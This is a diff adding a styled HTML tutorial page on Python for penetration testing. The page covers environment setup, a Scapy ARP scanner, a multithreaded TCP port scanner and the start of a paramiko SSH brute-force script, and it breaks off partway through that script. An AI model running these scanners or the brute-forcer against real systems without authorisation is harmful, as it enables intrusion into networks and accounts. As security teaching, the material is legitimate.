@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Python Scripting in Cybersecurity | Nisarg Chasmawala</title>
+<meta name="description" content="Python Environment and Scripting in Cybersecurity - a complete field guide by Nisarg Chasmawala (Shroff), Offensive Security Engineer.">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--g:#00ff41;--c:#00e5ff;--p:#bf00ff;--r:#ff003c;--o:#ffd700;--bg:#030509;--t1:#d4ffe0;--t2:#7aad82;--t3:#2e4a32;--mono:'Share Tech Mono',monospace;--dsp:'Orbitron',sans-serif;--body:'Rajdhani',sans-serif;--glow:0 0 20px rgba(0,255,65,.4),0 0 60px rgba(0,255,65,.15);--cglow:0 0 20px rgba(0,229,255,.4),0 0 60px rgba(0,229,255,.1);--pglow:0 0 20px rgba(191,0,255,.4),0 0 60px rgba(191,0,255,.1)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;overflow-x:hidden}
+body{background:var(--bg);color:var(--t1);font-family:var(--body);font-size:17px;line-height:1.8;overflow-x:hidden;cursor:none}
+#bg-particle{position:fixed;inset:0;z-index:0;pointer-events:none}
+#bg-hex{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35}
+#bg-scan{position:fixed;inset:0;z-index:9999;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.009) 2px,rgba(0,255,65,.009) 4px)}
+#bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(ellipse at 50% 50%,transparent 50%,rgba(3,5,9,.85) 100%)}
+#bg-noise{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.04;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:200px 200px;animation:grain .4s steps(1) infinite}
+@keyframes grain{0%{transform:translate(0,0)}10%{transform:translate(-2%,-2%)}20%{transform:translate(2%,2%)}30%{transform:translate(-1%,1%)}40%{transform:translate(1%,-1%)}50%{transform:translate(-3%,1%)}60%{transform:translate(1%,3%)}70%{transform:translate(-1%,-2%)}80%{transform:translate(2%,1%)}90%{transform:translate(-2%,2%)}}
+#cur{position:fixed;width:10px;height:10px;border-radius:50%;background:var(--g);box-shadow:var(--glow);pointer-events:none;z-index:99999;transform:translate(-50%,-50%);transition:width .1s,height .1s}
+#cur2{position:fixed;width:30px;height:30px;border-radius:50%;border:1px solid rgba(0,255,65,.5);pointer-events:none;z-index:99998;transform:translate(-50%,-50%);transition:left .08s,top .08s}
+#cur3{position:fixed;width:50px;height:50px;border-radius:50%;border:1px solid rgba(0,255,65,.2);pointer-events:none;z-index:99997;transform:translate(-50%,-50%);transition:left .15s,top .15s}
+#prog{position:fixed;top:0;left:0;height:2px;background:linear-gradient(to right,var(--g),var(--c),var(--p));box-shadow:0 0 10px var(--g);z-index:10000;width:0%}
+.topbar{position:fixed;top:0;left:0;right:0;height:58px;background:rgba(3,5,9,.88);border-bottom:1px solid rgba(0,255,65,.12);backdrop-filter:blur(20px) saturate(1.5);z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 32px}
+.tb-left{display:flex;flex-direction:column;gap:2px}
+.tb-name{font-family:var(--dsp);font-size:13px;font-weight:900;color:var(--t1);letter-spacing:3px}
+.tb-roles{font-family:var(--mono);font-size:9px;letter-spacing:1.5px;overflow:hidden;white-space:nowrap}
+.tb-inner{display:inline-block;color:var(--c);animation:ticker 18s linear infinite}
+@keyframes ticker{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+.tb-status{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:11px;color:var(--g)}
+.tb-dot{width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g);animation:tdot 1.2s ease-in-out infinite}
+@keyframes tdot{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.7)}}
+.toc{position:fixed;right:20px;top:50%;transform:translateY(-50%);z-index:200;display:flex;flex-direction:column;gap:9px}
+.toc-i{display:flex;align-items:center;gap:8px;cursor:pointer}
+.toc-d{width:6px;height:6px;border-radius:50%;border:1px solid var(--t3);transition:all .25s;flex-shrink:0}
+.toc-i.active .toc-d,.toc-i:hover .toc-d{background:var(--g);border-color:var(--g);box-shadow:0 0 10px var(--g)}
+.toc-l{font-family:var(--mono);font-size:10px;color:var(--t3);opacity:0;transform:translateX(6px);transition:all .2s;white-space:nowrap}
+.toc-i:hover .toc-l,.toc-i.active .toc-l{opacity:1;transform:none;color:var(--g)}
+@media(max-width:1000px){.toc{display:none}}
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 28px}
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:100px 0 60px;position:relative}
+.hero-canvas-wrap{position:absolute;right:-80px;top:50%;transform:translateY(-52%);width:500px;height:500px;pointer-events:none}
+#hero-geo{width:100%;height:100%}
+.hero-tag{font-family:var(--mono);font-size:11px;letter-spacing:4px;color:var(--c);text-transform:uppercase;margin-bottom:18px;opacity:0;animation:fup .6s ease forwards .3s;display:flex;align-items:center;gap:12px}
+.hero-tag::before{content:'';width:40px;height:1px;background:linear-gradient(to right,transparent,var(--c))}
+.hero-tag::after{content:'';flex:1;max-width:100px;height:1px;background:linear-gradient(to right,var(--c),transparent)}
+.hero-title{font-family:var(--dsp);font-size:clamp(18px,3.5vw,42px);font-weight:900;line-height:1.0;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;opacity:0;animation:fup .7s ease forwards .5s}
+.ht-line1{display:block;color:var(--g);text-shadow:0 0 40px rgba(0,255,65,.6),0 0 100px rgba(0,255,65,.25)}
+.ht-sub{display:block;font-size:.43em;letter-spacing:5px;color:rgba(200,255,220,.5);font-weight:400;margin-top:10px}
+.gw{position:relative;display:inline-block}
+.gw::before,.gw::after{content:attr(data-t);position:absolute;top:0;left:0;width:100%;font-family:var(--dsp);font-weight:900;font-size:inherit;letter-spacing:inherit;text-transform:uppercase}
+.gw::before{color:var(--c);animation:ga 5s infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}
+.gw::after{color:var(--r);animation:gb 5s infinite;clip-path:polygon(0 66%,100% 66%,100% 100%,0 100%)}
+@keyframes ga{0%,85%,100%{transform:none;opacity:0}87%{transform:translate(-5px,2px);opacity:.9}93%{transform:none;opacity:0}}
+@keyframes gb{0%,87%,100%{transform:none;opacity:0}89%{transform:translate(5px,3px);opacity:.8}95%{transform:none;opacity:0}}
+.hero-desc{font-size:17px;font-weight:300;color:var(--t2);max-width:560px;line-height:1.75;margin-bottom:36px;opacity:0;animation:fup .8s ease forwards .8s;margin-top:20px}
+.hero-meta{display:flex;gap:24px;flex-wrap:wrap;opacity:0;animation:fup .8s ease forwards 1s}
+.m-item{display:flex;flex-direction:column;gap:3px}
+.m-lbl{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase}
+.m-val{font-family:var(--mono);font-size:12px;color:var(--c)}
+.hero-scroll-hint{position:absolute;bottom:24px;left:0;display:flex;align-items:center;gap:12px;opacity:0;animation:fin 1s ease forwards 1.8s}
+.hs-line{width:60px;height:1px;background:linear-gradient(to right,var(--g),transparent)}
+.hs-txt{font-family:var(--mono);font-size:9px;letter-spacing:3px;color:var(--t3)}
+.hs-pulse{width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 8px var(--g);animation:tdot 1.5s ease-in-out infinite}
+.sec{margin-bottom:100px}
+.sec-hd{display:flex;align-items:center;gap:14px;margin-bottom:40px}
+.sec-n{font-family:var(--mono);font-size:10px;color:var(--p);letter-spacing:2px;min-width:44px}
+.sec-ln{flex:1;height:1px;background:linear-gradient(to right,rgba(0,229,255,.35),transparent)}
+.sec-t{font-family:var(--dsp);font-size:clamp(14px,2.4vw,21px);font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--c);text-shadow:var(--cglow)}
+.tw-cursor{display:inline-block;width:2px;height:1em;background:var(--c);margin-left:4px;animation:blink 1s step-end infinite;vertical-align:middle}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.sec-ai .sec-t{color:#bf00ff;text-shadow:var(--pglow)}
+.sec-ai .sec-n{color:var(--c)}
+.sec-ai .sec-ln{background:linear-gradient(to right,rgba(191,0,255,.35),transparent)}
+.sec-ai .tw-cursor{background:#bf00ff}
+.panel{background:rgba(0,255,65,.025);border:1px solid rgba(0,255,65,.12);border-radius:4px;padding:32px;margin-bottom:22px;position:relative;overflow:hidden;transition:border-color .3s,box-shadow .3s,transform .3s}
+.panel::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(to bottom,var(--g),transparent);opacity:0;transition:opacity .3s}
+.panel::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.015) 0%,transparent 60%);pointer-events:none}
+.panel:hover{border-color:rgba(0,229,255,.4);box-shadow:0 0 50px rgba(0,229,255,.07),0 20px 60px rgba(0,0,0,.3);transform:translateY(-3px)}
+.panel:hover::before{opacity:1}
+.panel p{color:var(--t2);margin-bottom:12px}
+.panel p:last-child{margin-bottom:0}
+.panel-t{font-family:var(--dsp);font-size:12px;font-weight:700;letter-spacing:3px;color:var(--g);text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:12px}
+.panel-t::after{content:'';flex:1;height:1px;background:linear-gradient(to right,rgba(0,255,65,.2),transparent)}
+.panel-ai{background:rgba(191,0,255,.03);border-color:rgba(191,0,255,.18)}
+.panel-ai:hover{border-color:rgba(191,0,255,.45)}
+.panel-ai .panel-t{color:#bf00ff}
+.panel-ai .panel-t::after{background:linear-gradient(to right,rgba(191,0,255,.2),transparent)}
+.panel-ai::before{background:linear-gradient(to bottom,#bf00ff,transparent)}
+.ai-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:16px;margin:20px 0}
+.ai-card{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-radius:4px;padding:22px;position:relative;overflow:hidden;transition:all .3s}
+.ai-card::after{content:'';position:absolute;top:0;right:0;width:0;height:0;border-top:26px solid rgba(191,0,255,.25);border-left:26px solid transparent}
+.ai-card:hover{border-color:rgba(191,0,255,.5);box-shadow:var(--pglow),0 16px 40px rgba(0,0,0,.25);transform:translateY(-3px)}
+.ai-ico{font-size:24px;margin-bottom:10px;display:block}
+.ai-name{font-family:var(--dsp);font-size:11px;font-weight:700;letter-spacing:2px;color:#bf00ff;text-transform:uppercase;margin-bottom:10px}
+.ai-desc{font-size:14px;color:var(--t2);line-height:1.65;font-weight:300}
+.alert{border-radius:4px;padding:16px 20px;margin:20px 0;display:flex;gap:14px;align-items:flex-start}
+.al-w{background:rgba(255,215,0,.04);border:1px solid rgba(255,215,0,.18);border-left:3px solid var(--o)}
+.al-p{background:rgba(191,0,255,.04);border:1px solid rgba(191,0,255,.18);border-left:3px solid #bf00ff}
+.al-i{background:rgba(0,229,255,.04);border:1px solid rgba(0,229,255,.14);border-left:3px solid var(--c)}
+.al-ic{font-family:var(--mono);font-size:13px;flex-shrink:0;margin-top:2px}
+.al-w .al-ic{color:var(--o)}.al-p .al-ic{color:#bf00ff}.al-i .al-ic{color:var(--c)}
+.al-tx{font-size:14px;color:var(--t2);line-height:1.6}
+.ptbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin:16px 0}
+.ptbl th{text-align:left;padding:11px 14px;color:var(--c);border-bottom:1px solid rgba(0,229,255,.3);letter-spacing:2px;font-size:10px;text-transform:uppercase}
+.ptbl td{padding:10px 14px;color:var(--t2);border-bottom:1px solid rgba(0,255,65,.05);vertical-align:top}
+.ptbl tr:hover td{background:rgba(0,255,65,.02)}
+.ptbl td:first-child{color:var(--g);font-weight:700}
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:14px;margin:20px 0}
+.tc{background:rgba(0,229,255,.03);border:1px solid rgba(0,229,255,.1);border-radius:4px;padding:18px;transition:all .25s;position:relative;overflow:hidden}
+.tc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:linear-gradient(to right,var(--c),transparent);transform:scaleX(0);transform-origin:left;transition:transform .3s}
+.tc:hover{border-color:rgba(0,229,255,.4);background:rgba(0,229,255,.06);box-shadow:var(--cglow),0 12px 40px rgba(0,0,0,.2);transform:translateY(-3px)}
+.tc:hover::after{transform:scaleX(1)}
+.tcname{font-family:var(--mono);font-size:12px;color:var(--c);margin-bottom:4px}
+.tctag{font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--o);text-transform:uppercase;margin-bottom:6px;display:block}
+.tcdesc{font-size:12px;color:var(--t3);line-height:1.45}
+.cb{background:rgba(0,0,0,.7);border:1px solid rgba(0,255,65,.1);border-left:3px solid var(--g);border-radius:0 4px 4px 0;padding:22px 26px;margin:16px 0;position:relative;overflow-x:auto;cursor:pointer;transition:all .3s}
+.cb::before{content:attr(data-l);position:absolute;top:0;right:0;font-family:var(--mono);font-size:9px;letter-spacing:2px;color:var(--g);background:rgba(0,255,65,.07);padding:3px 12px;border-bottom-left-radius:4px;text-transform:uppercase}
+.cb:hover{border-color:rgba(0,255,65,.35)}
+.cb.cb-ai{border-left-color:#bf00ff}.cb.cb-ai::before{color:#bf00ff;background:rgba(191,0,255,.07)}
+.cb code{font-family:var(--mono);font-size:13px;color:var(--g);white-space:pre;display:block;line-height:1.9}
+.cta{background:linear-gradient(135deg,rgba(0,255,65,.04),rgba(191,0,255,.04));border:1px solid rgba(0,229,255,.3);border-radius:4px;padding:60px 50px;text-align:center;position:relative;overflow:hidden;margin-top:80px}
+.cta::before{content:'PY';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:var(--dsp);font-size:260px;font-weight:900;color:rgba(0,255,65,.018);pointer-events:none;letter-spacing:30px}
+.cta-t{font-family:var(--dsp);font-size:20px;font-weight:700;letter-spacing:4px;color:var(--g);text-transform:uppercase;margin-bottom:16px;text-shadow:var(--glow)}
+.cta-p{color:var(--t2);font-size:16px;max-width:540px;margin:0 auto 32px;line-height:1.75}
+.cta-btns{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.btn{font-family:var(--mono);font-size:11px;letter-spacing:3px;text-transform:uppercase;padding:13px 30px;border-radius:2px;text-decoration:none;display:inline-block;transition:all .25s}
+.btn-p{border:1px solid var(--g);color:var(--g);background:rgba(0,255,65,.06)}
+.btn-p:hover{background:var(--g);color:var(--bg);box-shadow:var(--glow)}
+.btn-s{border:1px solid var(--c);color:var(--c);background:rgba(0,229,255,.05)}
+.btn-s:hover{background:var(--c);color:var(--bg);box-shadow:var(--cglow)}
+.footer{border-top:1px solid rgba(0,255,65,.1);padding:32px 0;margin-top:60px;display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:20px}
+.f-l{font-family:var(--mono);font-size:11px;color:var(--t3);letter-spacing:1.5px;line-height:2}
+.f-alias{color:var(--g);font-size:10px;letter-spacing:3px;text-shadow:0 0 8px var(--g)}
+.f-r{font-family:var(--mono);font-size:11px;color:var(--t3);text-align:right;line-height:2}
+.f-r a{color:var(--g);text-decoration:none}
+.f-r a:hover{text-shadow:var(--glow)}
+.div{height:1px;background:linear-gradient(to right,transparent,rgba(0,255,65,.15),transparent);margin:60px 0;position:relative}
+.div::after{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:6px;height:6px;border-radius:50%;background:var(--g);box-shadow:0 0 12px var(--g)}
+.div-ai{background:linear-gradient(to right,transparent,rgba(191,0,255,.22),transparent)}
+.div-ai::after{background:#bf00ff;box-shadow:0 0 12px #bf00ff}
+@keyframes fup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
+@keyframes fin{from{opacity:0}to{opacity:1}}
+.rv{opacity:0;transform:translateY(30px);transition:opacity .8s,transform .8s}
+.rv-l{opacity:0;transform:translateX(-30px);transition:opacity .8s,transform .8s}
+.rv.on,.rv-l.on{opacity:1;transform:none}
+@media(max-width:700px){.ai-grid,.tgrid{grid-template-columns:1fr}.hero-canvas-wrap{display:none}.cta{padding:36px 20px}}
+</style>
+</head>
+<body>
+<canvas id="bg-particle"></canvas>
+<canvas id="bg-hex"></canvas>
+<div id="bg-vignette"></div>
+<div id="bg-noise"></div>
+<div id="bg-scan"></div>
+<div id="cur"></div><div id="cur2"></div><div id="cur3"></div>
+<div id="prog"></div>
+<nav class="topbar">
+  <div class="tb-left">
+    <span class="tb-name">NISARG CHASMAWALA (SHROFF)</span>
+    <div class="tb-roles"><span class="tb-inner">Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp; Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics &nbsp;|&nbsp; Penetration Tester &nbsp;|&nbsp; Vulnerability Assessment &nbsp;|&nbsp; Cybersecurity Researcher &nbsp;|&nbsp; Offensive Security Engineer &nbsp;|&nbsp; Digital Forensics</span></div>
+  </div>
+  <div class="tb-status"><span class="tb-dot"></span>SYS ONLINE</div>
+</nav>
+<nav class="toc" id="toc">
+  <div class="toc-i active" onclick="goTo('#hero')" data-s="hero"><div class="toc-d"></div><span class="toc-l">INTRO</span></div>
+  <div class="toc-i" onclick="goTo('#env')" data-s="env"><div class="toc-d"></div><span class="toc-l">ENVIRONMENT</span></div>
+  <div class="toc-i" onclick="goTo('#network')" data-s="network"><div class="toc-d"></div><span class="toc-l">NETWORK SCANNING</span></div>
+  <div class="toc-i" onclick="goTo('#exploit')" data-s="exploit"><div class="toc-d"></div><span class="toc-l">EXPLOIT DEV</span></div>
+  <div class="toc-i" onclick="goTo('#osint')" data-s="osint"><div class="toc-d"></div><span class="toc-l">OSINT / WEB</span></div>
+  <div class="toc-i" onclick="goTo('#forensics')" data-s="forensics"><div class="toc-d"></div><span class="toc-l">FORENSICS</span></div>
+  <div class="toc-i" onclick="goTo('#defence')" data-s="defence"><div class="toc-d"></div><span class="toc-l">DEFENCE</span></div>
+  <div class="toc-i" onclick="goTo('#ai')" data-s="ai"><div class="toc-d"></div><span class="toc-l">AI INTEGRATION</span></div>
+</nav>
+<div class="wrap">
+
+<section class="hero" id="hero">
+  <div class="hero-canvas-wrap"><canvas id="hero-geo"></canvas></div>
+  <div class="hero-tag">NISARG CHASMAWALA &nbsp;//&nbsp; ALIAS: HEAVEN</div>
+  <h1 class="hero-title">
+    <div class="gw" data-t="PYTHON SCRIPTING"><span class="ht-line1">PYTHON SCRIPTING</span></div>
+    <span class="ht-sub">CYBERSECURITY AUTOMATION + EXPLOITATION + AI INTEGRATION</span>
+  </h1>
+  <p class="hero-desc">A complete Python scripting field guide for cybersecurity professionals covering environment setup and virtual environments, network scanning with Scapy and socket, SSH brute forcing, OSINT web scraping, port scanning, digital forensics, defensive scripting, and full AI integration. Python is the dominant language of modern offensive and defensive security.</p>
+  <div class="hero-meta">
+    <div class="m-item"><span class="m-lbl">Author</span><span class="m-val">Nisarg Chasmawala (Shroff)</span></div>
+    <div class="m-item"><span class="m-lbl">Alias</span><span class="m-val">HEAVEN</span></div>
+    <div class="m-item"><span class="m-lbl">Platform</span><span class="m-val">Linux &middot; Kali &middot; Parrot &middot; macOS &middot; Windows</span></div>
+    <div class="m-item"><span class="m-lbl">Category</span><span class="m-val">Scripting &middot; Red &amp; Blue Team &middot; AI</span></div>
+  </div>
+  <div class="hero-scroll-hint"><div class="hs-line"></div><span class="hs-txt">SCROLL TO BEGIN</span><div class="hs-pulse"></div></div>
+</section>
+<div class="div"></div>
+
+<section class="sec rv" id="env">
+  <div class="sec-hd"><span class="sec-n">01 //</span><h2 class="sec-t">Python Environment Setup<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p><strong style="color:var(--t1)">Python</strong> is the dominant scripting language in modern cybersecurity. Its combination of simple syntax, an enormous library ecosystem, cross-platform compatibility, and deep integration with security tooling makes it the first choice for penetration testers, forensic analysts, malware researchers, and security automation engineers. Python ships with most Linux distributions and macOS, and installing it on Windows takes under two minutes.</p>
+    <p>The critical habit for any cybersecurity Python workflow is using <strong style="color:var(--c)">virtual environments</strong> -- isolated Python installs per project that prevent library version conflicts and keep your tooling clean. A Kali box running five different offensive Python tools, each needing different library versions, works cleanly when each tool has its own virtual environment.</p>
+  </div>
+  <div class="cb rv" data-l="Python Environment -- Install, venv, and Security Libraries">
+    <code><span style="color:var(--t3)"># Check / install Python</span>
+<span style="color:var(--c)">python3 --version</span>
+<span style="color:var(--c)">sudo apt update && sudo apt install python3 python3-pip python3-venv</span>  <span style="color:var(--t3)"># Kali/Parrot/Ubuntu</span>
+<span style="color:var(--t3)"># macOS: brew install python3</span>
+<span style="color:var(--t3)"># Windows: python.org/downloads -- check "Add Python to PATH"</span>
+
+<span style="color:var(--t3)"># Create project-specific virtual environment</span>
+<span style="color:var(--c)">python3 -m venv</span> <span style="color:#ffa07a">cybersec-env</span>
+<span style="color:var(--c)">source</span> cybersec-env/bin/activate       <span style="color:var(--t3)"># Linux/macOS</span>
+<span style="color:var(--t3)"># cybersec-env\Scriptsctivate        # Windows</span>
+
+<span style="color:var(--t3)"># Install essential security libraries</span>
+<span style="color:var(--c)">pip install</span> requests scapy paramiko    <span style="color:var(--t3)"># networking + SSH</span>
+<span style="color:var(--c)">pip install</span> beautifulsoup4 lxml         <span style="color:var(--t3)"># HTML parsing / OSINT</span>
+<span style="color:var(--c)">pip install</span> python-nmap impacket        <span style="color:var(--t3)"># nmap wrapper + Windows protocols</span>
+<span style="color:var(--c)">pip install</span> cryptography pycryptodome   <span style="color:var(--t3)"># crypto operations</span>
+<span style="color:var(--c)">pip install</span> openai anthropic            <span style="color:var(--t3)"># AI integration</span>
+<span style="color:var(--c)">pip install</span> volatility3                 <span style="color:var(--t3)"># memory forensics</span>
+<span style="color:var(--c)">pip freeze</span> > requirements.txt          <span style="color:var(--t3)"># lock versions for reproducibility</span>
+<span style="color:var(--c)">deactivate</span>                              <span style="color:var(--t3)"># exit virtual env</span>
+
+<span style="color:var(--t3)"># Useful environment management</span>
+<span style="color:var(--c)">pip list --outdated</span>                     <span style="color:var(--t3)"># find stale packages</span>
+<span style="color:var(--c)">pip install --upgrade</span> pip               <span style="color:var(--t3)"># keep pip current</span></code>
+  </div>
+  <div class="panel rv">
+    <div class="panel-t">Key Python Security Libraries</div>
+    <table class="ptbl">
+      <thead><tr><th>Library</th><th>Category</th><th>Security Use Case</th></tr></thead>
+      <tbody>
+        <tr><td>scapy</td><td>Network</td><td>Packet crafting, ARP scanning, network discovery, custom protocol implementation</td></tr>
+        <tr><td>requests</td><td>HTTP</td><td>Web scraping, API interaction, fuzzing HTTP endpoints, OSINT data collection</td></tr>
+        <tr><td>paramiko</td><td>SSH</td><td>SSH client automation, brute force testing, remote command execution on authorised systems</td></tr>
+        <tr><td>python-nmap</td><td>Scanning</td><td>Programmatic Nmap wrapper for port scanning and OS fingerprinting in scripts</td></tr>
+        <tr><td>impacket</td><td>Windows</td><td>SMB, NTLM, Kerberos protocol implementation -- AD attack automation</td></tr>
+        <tr><td>beautifulsoup4</td><td>OSINT</td><td>HTML parsing for web intelligence gathering, link and email extraction</td></tr>
+        <tr><td>cryptography</td><td>Crypto</td><td>Symmetric/asymmetric encryption, hashing, certificate parsing</td></tr>
+        <tr><td>volatility3</td><td>Forensics</td><td>Memory image analysis, process extraction, malware artefact hunting</td></tr>
+        <tr><td>pwntools</td><td>Exploit Dev</td><td>Binary exploitation framework -- buffer overflow, ROP chain, shellcode generation</td></tr>
+        <tr><td>openai</td><td>AI</td><td>GPT-4/o integration for log analysis, script generation, threat intelligence</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<section class="sec rv" id="network">
+  <div class="sec-hd"><span class="sec-n">02 //</span><h2 class="sec-t">Network Scanning &amp; Discovery<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Network scanning is the first active step in any penetration test -- identifying live hosts, open ports, and running services on the target scope. Python provides two primary approaches: <strong style="color:var(--c)">Scapy</strong> for low-level packet crafting that gives complete control over every packet field (useful for stealth and custom probes), and <strong style="color:var(--c)">socket</strong> for fast TCP connect scanning. Combined with python-nmap for Nmap integration, Python covers every network discovery use case from basic host enumeration to advanced protocol probing.</p>
+  </div>
+  <div class="cb rv" data-l="Python Network Scanner -- ARP Discovery + Port Scan">
+    <code><span style="color:var(--t3)"># ARP Network Scanner using Scapy
+# Discovers all live hosts on local subnet (Layer 2 -- no ICMP needed)</span>
+<span style="color:#bd93f9">import</span> scapy.all <span style="color:#bd93f9">as</span> scapy
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">arp_scan</span>(subnet):
+    arp_req  = scapy.ARP(pdst=subnet)
+    bcast    = scapy.Ether(dst=<span style="color:#ff79c6">"ff:ff:ff:ff:ff:ff"</span>)
+    packet   = bcast / arp_req
+    answered = scapy.srp(packet, timeout=2, verbose=<span style="color:#bd93f9">False</span>)[0]
+
+    hosts = []
+    <span style="color:#bd93f9">for</span> _, resp <span style="color:#bd93f9">in</span> answered:
+        hosts.append({<span style="color:#ff79c6">"ip"</span>: resp.psrc, <span style="color:#ff79c6">"mac"</span>: resp.hwsrc})
+    <span style="color:#bd93f9">return</span> hosts
+
+<span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"{'IP Address':<20} {'MAC Address'}"</span>)
+<span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">"-" * 40</span>)
+<span style="color:#bd93f9">for</span> host <span style="color:#bd93f9">in</span> arp_scan(<span style="color:#ff79c6">"192.168.1.0/24"</span>):
+    <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"{host['ip']:<20} {host['mac']}"</span>)
+
+<span style="color:var(--t3)"># ── PORT SCANNER (socket-based, fast TCP connect) ────</span>
+<span style="color:#bd93f9">import</span> socket
+<span style="color:#bd93f9">from</span> concurrent.futures <span style="color:#bd93f9">import</span> ThreadPoolExecutor
+
+SERVICES = {
+    21:<span style="color:#ff79c6">'FTP'</span>, 22:<span style="color:#ff79c6">'SSH'</span>, 23:<span style="color:#ff79c6">'Telnet'</span>, 25:<span style="color:#ff79c6">'SMTP'</span>,
+    53:<span style="color:#ff79c6">'DNS'</span>, 80:<span style="color:#ff79c6">'HTTP'</span>, 443:<span style="color:#ff79c6">'HTTPS'</span>, 445:<span style="color:#ff79c6">'SMB'</span>,
+    3306:<span style="color:#ff79c6">'MySQL'</span>, 3389:<span style="color:#ff79c6">'RDP'</span>, 5432:<span style="color:#ff79c6">'PostgreSQL'</span>,
+}
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">scan_port</span>(target, port):
+    <span style="color:#bd93f9">try</span>:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        <span style="color:#bd93f9">if</span> s.connect_ex((target, port)) == 0:
+            svc = SERVICES.get(port, <span style="color:#ff79c6">'unknown'</span>)
+            <span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"  [OPEN] {port:<6}/tcp  {svc}"</span>)
+        s.close()
+    <span style="color:#bd93f9">except</span>: <span style="color:#bd93f9">pass</span>
+
+target = <span style="color:#ff79c6">"192.168.1.10"</span>
+<span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"
+[*] Scanning {target}
+"</span>)
+<span style="color:#bd93f9">with</span> ThreadPoolExecutor(max_workers=100) <span style="color:#bd93f9">as</span> ex:
+    <span style="color:#bd93f9">for</span> p <span style="color:#bd93f9">in</span> <span style="color:#8be9fd">range</span>(1, 1025):
+        ex.submit(scan_port, target, p)</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<section class="sec rv" id="exploit">
+  <div class="sec-hd"><span class="sec-n">03 //</span><h2 class="sec-t">Exploit Development &amp; Brute Forcing<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Python's <strong style="color:var(--c)">paramiko</strong> library implements the SSH2 protocol in pure Python, enabling automated authentication testing on authorised targets. Python is also the primary language for exploit development and vulnerability research -- libraries like <strong style="color:var(--c)">pwntools</strong> provide a complete binary exploitation framework including buffer overflow padding, ROP chain construction, shellcode generation, and remote process interaction. All scripts below are for authorised penetration testing engagements only.</p>
+  </div>
+  <div class="alert al-w rv">
+    <span class="al-ic">[ ! ]</span>
+    <p class="al-tx"><strong>Authorised Engagements Only.</strong> The scripts below are for controlled lab environments, CTF challenges, and authorised penetration testing with written scope. Deploying against any system without explicit written authorisation is illegal under the Computer Misuse Act and equivalent global legislation.</p>
+  </div>
+  <div class="cb rv" data-l="Python SSH Brute Force -- Authorised Testing">
+    <code><span style="color:var(--t3)"># SSH Brute Force Tester -- authorised pentesting only
+# Tests credential lists against SSH service on target host</span>
+<span style="color:#bd93f9">import</span> paramiko, sys
+<span style="color:#bd93f9">from</span> pathlib <span style="color:#bd93f9">import</span> Path
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">try_ssh</span>(ip, username, password, port=22, timeout=3):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    <span style="color:#bd93f9">try</span>:
+        client.connect(ip, port=port, username=username,
